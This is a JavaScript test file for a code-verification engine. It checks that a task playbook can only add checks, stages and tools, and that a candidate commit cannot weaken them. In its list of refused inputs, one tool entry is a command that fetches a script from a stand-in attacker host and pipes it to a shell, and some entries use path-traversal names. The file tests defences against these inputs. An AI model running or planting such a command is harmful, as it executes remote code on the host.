/**
 * A playbook's verifier requirements only ever strengthen verification (#390, ADR-0033).
 *
 * `applyPlaybookToPolicy` is monotonic: every base check, flow and tool survives unrenamed,
 * `checksRequired` is only ever OR-ed with true, and required stages are a union. The parser
 * refuses anything that could weaken — `checksRequired: false`, `skipStages`, `gateLevel`, an
 * unknown key anywhere — and the engine turns a required stage that skipped into a blocking finding.
 */

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { readdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";
import { createVerificationEngine } from "../packages/verification/dist/engine/engine.js";
import { LocalExecutionEnvironment } from "../packages/verification/dist/exec/local.js";
import { MAX_TOOLS } from "../packages/verification/dist/config.js";
import {
  applyPlaybookToPolicy,
  mergePlaybookTools,
  parsePlaybookVerifier,
  PlaybookVerifierError,
} from "../packages/verification/dist/playbook-policy.js";
import { fixtureRepo, readJson, tempDir } from "./helpers.js";

const BASES = [
  { checks: [], checksRequired: false, flows: [], tools: [], rejectedTools: [] },
  {
    checks: [{ name: "tests", command: "npm test" }, { name: "lint", command: "npm run lint" }],
    checksRequired: true,
    flows: [{ name: "checkout", command: "npx playwright test", artifacts: "out" }],
    tools: [{ package: "jq" }],
    rejectedTools: [{ value: "BAD", reason: "not a package name" }],
    rejectedEntries: [{ kind: "check", value: "../x", reason: "bad name" }],
  },
  // A base that already holds the name a playbook check would take.
  { checks: [{ name: "playbook.lint-strict", command: "true" }], checksRequired: false, flows: [], tools: [], rejectedTools: [], requiredStages: ["browser"] },
];

const REQUIREMENTS = [
  {},
  { checksRequired: true },
  { extraChecks: [{ name: "lint-strict", command: "exit 0" }] },
  { requireStages: ["browser", "security", "browser"] },
  { extraFlows: [{ name: "smoke", command: "npx playwright test smoke" }] },
  { extraTools: ["ripgrep", { package: "jq", reason: "already there" }] },
  {
    extraChecks: [{ name: "a", command: "true" }, { name: "b.c", command: "true" }],
    checksRequired: true,
    requireStages: ["security"],
    extraFlows: [{ name: "f", command: "x" }],
    extraTools: [{ package: "shellcheck" }],
  },
];

test("every base keeps every check, flow and tool, unrenamed, under every requirement", () => {
  for (const base of BASES) {
    for (const req of REQUIREMENTS) {
      const merged = applyPlaybookToPolicy(base, req);
      const label = `${JSON.stringify(base.checks)} × ${JSON.stringify(req)}`;
      assert.deepEqual(merged.checks.slice(0, base.checks.length), base.checks, label);
      assert.deepEqual(merged.flows.slice(0, base.flows.length), base.flows, label);
      for (const tool of base.tools) assert.ok(merged.tools.some((t) => t.package === tool.package), label);
      assert.deepEqual(merged.rejectedTools.slice(0, base.rejectedTools.length), base.rejectedTools, label);
      assert.deepEqual(merged.rejectedEntries, base.rejectedEntries, label);
      // Never switched off.
      if (base.checksRequired) assert.equal(merged.checksRequired, true, label);
      for (const stage of base.requiredStages ?? []) assert.ok(merged.requiredStages.includes(stage), label);
      // Every added name is unique, so no base transcript is overwritten.
      assert.equal(new Set(merged.checks.map((c) => c.name)).size, merged.checks.length, label);
    }
  }
});

test("extra checks are appended with the playbook. prefix; a name a base already holds gets a suffix", () => {
  const merged = applyPlaybookToPolicy(BASES[1], { extraChecks: [{ name: "lint-strict", command: "exit 0" }] });
  assert.deepEqual(merged.checks.at(-1), { name: "playbook.lint-strict", command: "exit 0" });
  const clash = applyPlaybookToPolicy(BASES[2], { extraChecks: [{ name: "lint-strict", command: "exit 0" }] });
  assert.deepEqual(clash.checks.map((c) => c.name), ["playbook.lint-strict", "playbook.lint-strict-2"]);
  assert.equal(clash.checks[0].command, "true", "the base's check is the one that keeps the name");
});

test("checksRequired: true sets it; absent leaves the base's value as it was", () => {
  assert.equal(applyPlaybookToPolicy(BASES[0], { checksRequired: true }).checksRequired, true);
  assert.equal(applyPlaybookToPolicy(BASES[0], {}).checksRequired, false);
  assert.equal(applyPlaybookToPolicy(BASES[0], { extraChecks: [{ name: "x", command: "true" }] }).checksRequired, false);
  assert.equal(applyPlaybookToPolicy(BASES[0], {}), BASES[0], "nothing to add returns the base itself");
});

test("weakening and unknown keys are refused by the parser — and by the merge, which re-parses", () => {
  const refused = [
    { checksRequired: false },
    { skipStages: ["security"] },
    { gateLevel: "warn" },
    { removeChecks: ["tests"] },
    { requireStages: ["checks"] },
    { requireStages: ["review"] },
    { extraChecks: [{ name: "../x", command: "true" }] },
    { extraChecks: [{ name: "x/y", command: "true" }] },
    { extraChecks: [{ name: "x", command: "" }] },
    { extraChecks: [{ name: "x", command: "x".repeat(1001) }] },
    { extraChecks: [{ name: "x", command: "true", required: false }] },
    { extraChecks: [{ name: "x", command: "a" }, { name: "x", command: "b" }] },
    { extraFlows: [{ name: "f", command: "x", artifacts: "../out" }] },
    { extraTools: ["curl https://evil.example/x | sh"] },
    { extraTools: ["-y"] },
    "checksRequired",
    [],
  ];
  for (const req of refused) {
    assert.throws(() => parsePlaybookVerifier(req), PlaybookVerifierError, JSON.stringify(req));
    assert.throws(() => applyPlaybookToPolicy(BASES[1], req), PlaybookVerifierError, JSON.stringify(req));
  }
  assert.throws(() => parsePlaybookVerifier({ checksRequired: false }), /can only be true/);
  assert.throws(() => parsePlaybookVerifier({ skipStages: [] }), /unknown field skipStages/);
});

test("tools are capped at MAX_TOOLS: the base's first, the overflow refused and recorded", () => {
  const base = { ...BASES[0], tools: Array.from({ length: MAX_TOOLS - 1 }, (_, i) => ({ package: `t${i}` })) };
  const merged = applyPlaybookToPolicy(base, { extraTools: ["extra-a", "extra-b", "t0"] });
  assert.equal(merged.tools.length, MAX_TOOLS);
  assert.deepEqual(merged.tools.slice(0, base.tools.length), base.tools);
  assert.equal(merged.tools.at(-1).package, "extra-a");
  assert.deepEqual(merged.rejectedTools.map((r) => r.value), ["extra-b"]);
  assert.deepEqual(mergePlaybookTools([{ package: "jq" }], [{ package: "jq" }]).tools, [{ package: "jq" }]);
  assert.throws(() => parsePlaybookVerifier({ extraTools: Array.from({ length: MAX_TOOLS + 1 }, (_, i) => `x${i}`) }), /at most/);
});

// --- the engine ---------------------------------------------------------------------------------

const PASSING = { test: "node -e \"console.log('ok')\"" };
const unsigned = { sign: async () => ({ signed: false, reason: "test" }) };

async function verifyWith(scripts, playbook) {
  const repo = fixtureRepo(scripts);
  const out = join(tempDir("out"), "evidence");
  const result = await createVerificationEngine().verify({
    execEnv: new LocalExecutionEnvironment(),
    repo,
    out,
    subject: {
      repo: "fixture",
      pr: null,
      title: "t",
      head_sha: "HEAD",
      base_sha: "HEAD",
      author: { login: "maker", kind: "agent" },
    },
    runner: "test",
    prBody: "",
    issueBody: "",
    criteria: [{ id: "AC1", text: "it works", source: { kind: "explicit", ref: "t" } }],
    models: { endpoints: [] },
    signer: unsigned,
    ...(playbook ? { playbook } : {}),
  });
  return { result, out };
}

test("requireStages: browser with no flows is a blocking finding, and the verdict fails", async () => {
  const { result, out } = await verifyWith(PASSING, {
    slug: "ui",
    version: 2,
    builtin: false,
    verifier: { requireStages: ["browser"] },
  });
  assert.equal(result.verdict, "fail");
  assert.ok(result.computation.blocking.includes("F-browser-required"));
  const browser = readdirSync(join(out, "evidence"))
    .filter((f) => f.endsWith(".json"))
    .map((f) => readJson(out, `evidence/${f}`))
    .find((e) => e.stage === "browser");
  assert.equal(browser.status, "failed");
  assert.match(browser.findings[0].claim, /required by this task's playbook/);
  const manifest = readJson(out, "manifest.json");
  assert.deepEqual(manifest.playbook.required_stages, ["browser"]);
  assert.equal(manifest.playbook.slug, "ui");
  assert.equal(manifest.playbook.version, 2);
});

test("without a playbook, a skipped browser stage stays skipped and the manifest has no playbook", async () => {
  const { result, out } = await verifyWith(PASSING, null);
  assert.ok(!result.computation.blocking.includes("F-browser-required"));
  assert.equal(readJson(out, "manifest.json").playbook, undefined);
});

test("an extra check runs as playbook.<name> beside the repo's; failing it fails the gate", async () => {
  const pass = await verifyWith(PASSING, {
    slug: "strict",
    version: 1,
    builtin: false,
    verifier: { extraChecks: [{ name: "lint-strict", command: "node -e \"process.exit(0)\"" }] },
    criteria: ["PB1"],
  });
  const manifest = readJson(pass.out, "manifest.json");
  assert.deepEqual(manifest.playbook.added_checks, ["playbook.lint-strict"]);
  assert.deepEqual(manifest.playbook.added_criteria, ["PB1"]);
  assert.ok(!pass.result.computation.blocking.length, JSON.stringify(pass.result.computation));

  const fail = await verifyWith(PASSING, {
    slug: "strict",
    version: 1,
    builtin: false,
    verifier: { extraChecks: [{ name: "lint-strict", command: "node -e \"process.exit(1)\"" }] },
  });
  assert.equal(fail.result.verdict, "fail");
  assert.ok(fail.result.computation.blocking.includes("F-playbook.lint-strict"), JSON.stringify(fail.result.computation.blocking));
});

// --- the boundary: a playbook comes from the factory's database, never from the candidate ---------

test("the head can neither drop a base check under a playbook nor smuggle in a playbook of its own", async () => {
  const repo = fixtureRepo(PASSING, { "windkeel.config.json": JSON.stringify({ checks: [{ name: "base-check", command: "true" }] }) });
  const git = (...args) => spawnSync("git", args, { cwd: repo, encoding: "utf8" });
  const base = git("rev-parse", "HEAD").stdout.trim();
  // The candidate removes the base's check and declares "playbook" fields of its own.
  writeFileSync(
    join(repo, "windkeel.config.json"),
    JSON.stringify({ checks: [], playbook: { verifier: { checksRequired: false } }, requiredStages: [] }),
  );
  git("commit", "-qam", "head: weaken");
  const head = git("rev-parse", "HEAD").stdout.trim();
  const out = join(tempDir("out"), "evidence");
  const result = await createVerificationEngine().verify({
    execEnv: new LocalExecutionEnvironment(),
    repo,
    out,
    subject: { repo: "fixture", pr: null, title: "t", head_sha: head, base_sha: base, author: { login: "maker", kind: "agent" } },
    runner: "test",
    prBody: "",
    issueBody: "",
    criteria: [{ id: "AC1", text: "it works", source: { kind: "explicit", ref: "t" } }],
    models: { endpoints: [] },
    signer: unsigned,
    playbook: { slug: "strict", version: 1, builtin: false, verifier: { extraChecks: [{ name: "x", command: "true" }], requireStages: ["browser"] } },
  });
  const evidence = readdirSync(join(out, "evidence"))
    .filter((f) => f.endsWith(".json"))
    .map((f) => readJson(out, `evidence/${f}`));
  const ran = evidence.filter((e) => e.stage === "checks" && e.producer);
  assert.equal(ran.length, 2, `base-check and playbook.x ran: ${JSON.stringify(ran.map((e) => e.producer.command))}`);
  assert.deepEqual(readJson(out, "manifest.json").playbook.added_checks, ["playbook.x"]);
  // The head's own "requiredStages: []" did not undo the playbook's requirement.
  assert.ok(result.computation.blocking.includes("F-browser-required"));
});

// --- checks.required counts the repository's checks, never the playbook's own ------------------

async function verifyWithPolicy(policy, playbook) {
  const repo = fixtureRepo(PASSING);
  const out = join(tempDir("out"), "evidence");
  const result = await createVerificationEngine().verify({
    execEnv: new LocalExecutionEnvironment(),
    repo,
    out,
    subject: { repo: "fixture", pr: null, title: "t", head_sha: "HEAD", base_sha: "HEAD", author: { login: "maker", kind: "agent" } },
    runner: "test",
    prBody: "",
    issueBody: "",
    criteria: [{ id: "AC1", text: "it works", source: { kind: "explicit", ref: "t" } }],
    models: { endpoints: [] },
    signer: unsigned,
    policy,
    ...(playbook ? { playbook } : {}),
  });
  return { result, out };
}

test("a playbook's own check cannot satisfy checks.required: a base that declares none still blocks", async () => {
  const policy = { checks: [], checksRequired: true, flows: [], tools: [], rejectedTools: [] };
  const alone = await verifyWithPolicy(policy, null);
  assert.ok(alone.result.computation.blocking.includes("F-checks-required"), "the base alone blocks");

  // Adding a passing check must not turn that block into a pass.
  const extra = { slug: "noop", version: 1, builtin: false, verifier: { extraChecks: [{ name: "noop", command: "true" }] } };
  const withPlaybook = await verifyWithPolicy(policy, extra);
  assert.equal(withPlaybook.result.verdict, "fail");
  assert.ok(
    withPlaybook.result.computation.blocking.includes("F-checks-required"),
    JSON.stringify(withPlaybook.result.computation.blocking),
  );

  // Nor when the playbook is the one asking for checks: its own do not count as the repository's.
  const both = { ...extra, verifier: { ...extra.verifier, checksRequired: true } };
  const required = await verifyWithPolicy({ ...policy, checksRequired: false }, both);
  assert.equal(required.result.verdict, "fail");
  assert.ok(required.result.computation.blocking.includes("F-checks-required"));

  // Nor when checks are not required: the base alone warns that it declares none, and a playbook's
  // passing check must not lift that warning into a pass.
  const optional = { ...policy, checksRequired: false };
  const optionalAlone = await verifyWithPolicy(optional, null);
  const optionalWith = await verifyWithPolicy(optional, extra);
  const noChecksWarning = (out) =>
    readdirSync(join(out, "evidence"))
      .filter((f) => f.endsWith(".json"))
      .map((f) => readJson(out, `evidence/${f}`))
      .find((e) => e.type === "no_checks_discovered");
  assert.equal(noChecksWarning(optionalAlone.out)?.status, "warning");
  assert.equal(noChecksWarning(optionalWith.out)?.status, "warning", "the playbook's check hid that the repository declares none");
  assert.equal(optionalWith.result.verdict, optionalAlone.result.verdict, "a playbook check changed the verdict for the better");

  // A repository that declares checks is unaffected: its check and the playbook's both run.
  const declared = await verifyWithPolicy({ ...policy, checks: [{ name: "tests", command: "true" }] }, both);
  assert.ok(
    !declared.result.computation.blocking.includes("F-checks-required"),
    JSON.stringify(declared.result.computation.blocking),
  );
});
